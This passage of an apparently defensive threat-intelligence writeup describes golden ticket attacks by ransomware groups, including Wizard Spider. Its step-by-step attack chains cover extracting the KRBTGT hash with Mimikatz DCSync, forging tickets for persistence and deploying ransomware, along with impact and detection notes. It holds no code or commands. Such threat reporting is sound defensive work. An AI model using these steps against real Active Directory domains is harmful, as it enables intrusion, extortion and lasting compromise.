  2. Escalation to Domain Admin
  3. **Extract KRBTGT via Mimikatz DCSync**
  4. **Create golden tickets for all high-value accounts**
  5. Encrypt with ransomware
  6. Golden tickets enable re-entry even after incident response tries to reset passwords
- **Impact:** $10M+ ransom; persistent re-infection for weeks
- **Detection:** Only detected via behavioral analysis (unusual service access patterns)
- **Reference:** [Conti Ransomware Group Analysis](https://redcanary.com/blog/conti-ransomware-group/)

#### Example 3: Wizard Spider - Ongoing Campaigns (2024-2025)

- **Target:** Manufacturing, healthcare, finance
- **Timeline:** Current active threat
- **Technique Status:** Golden ticket as standard persistence mechanism
- **Attack Chain:**
  1. Initial access: RDP exploitation or phishing
  2. Escalate privileges
  3. Extract KRBTGT (Mimikatz on DC)
  4. **Generate golden tickets for multiple high-privilege accounts**
  5. Use tickets to access databases, file servers, email
  6. Persistence despite password resets and incident response
- **Impact:** BEC fraud, ransomware-as-service deployment, credential marketplace sales
- **Current Threat Level:** ACTIVE; organizations without KRBTGT monitoring remain highly vulnerable
- **Reference:** [Wizard Spider - IBM Threat Intelligence 2024](https://www.ibm.com/reports/threat-intelligence)

---